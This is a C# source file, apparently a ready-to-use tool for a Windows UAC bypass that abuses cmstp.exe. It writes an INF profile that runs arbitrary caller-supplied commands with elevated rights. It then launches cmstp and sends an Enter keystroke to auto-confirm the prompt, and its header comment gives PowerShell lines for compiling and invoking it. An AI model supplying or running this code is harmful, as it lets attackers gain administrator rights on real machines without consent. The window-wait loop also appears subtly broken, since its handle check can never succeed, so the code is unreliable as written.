﻿using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

/// <summary>
/// Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\ElevatedPrivileges.cs")) -OutputAssembly "ElevatedPrivileges.dll"
/// [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\ElevatedPrivileges.dll"))
/// If (([Management.Automation.PSTypeName]'ElevatedPrivileges').Type) { [ElevatedPrivileges]::Invoke("C:\ScheduledTask\ScheduledTask.exe") }
/// </summary>
public class ElevatedPrivileges
{
    public enum CmdShow { SW_SHOW = 5 }
    public enum Message { WM_KEYDOWN = 0x0100 }
    public enum KeyCodes { VK_RETURN = 0x0D }

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, CmdShow cmdShow);
    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, Message msg, KeyCodes wParam, int lParam = 0);

    public static string BuildServiceProfile(string cmdsHere)
    {
        var infFile = Path.GetRandomFileName().Split(new char[] { '.' })[0] + ".inf";
        var path = Path.Combine(Path.GetTempPath(), infFile);

        using (Stream stream = File.OpenWrite(path))
        using (StreamWriter writer = new StreamWriter(stream, Encoding.ASCII))
        {
            writer.Write(@"[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
%CommandsHere%
taskkill /im cmstp.exe /f
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
[Strings]
CommandsHere = ""{cmdsHere}""
UnexpectedError = ""An unexpected error occurred.  Please reboot and try the installation again.""
ServiceName=""ElevatedPrivileges""
ShortSvcName=""ed23c88e-8b38-4afe-be0f-cde578e23259""
".Replace("{cmdsHere}", cmdsHere));
        }

        return path;
    }

    public static bool Invoke(string cmdsHere)
    {
        var cmstp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");

        if (!File.Exists(cmstp))
        {
            return false;
        }

        var hWnd = IntPtr.Zero;
        var info = new ProcessStartInfo(cmstp);
        info.Arguments = @"/au """ + BuildServiceProfile(cmdsHere) + @"""";
        info.UseShellExecute = false;
        var proc = Process.Start(info);
        var sw = Stopwatch.StartNew();

        while (proc.MainWindowHandle == IntPtr.Zero)
        {
            if (proc.MainWindowHandle != IntPtr.Zero)
            {
                hWnd = proc.MainWindowHandle;
                break;
            }

            if (sw.Elapsed > TimeSpan.FromSeconds(5))
            {
                break;
            }
        }

        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
        {
            SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
        }

        proc.WaitForExit();
        return (proc.ExitCode == 0);
    }
}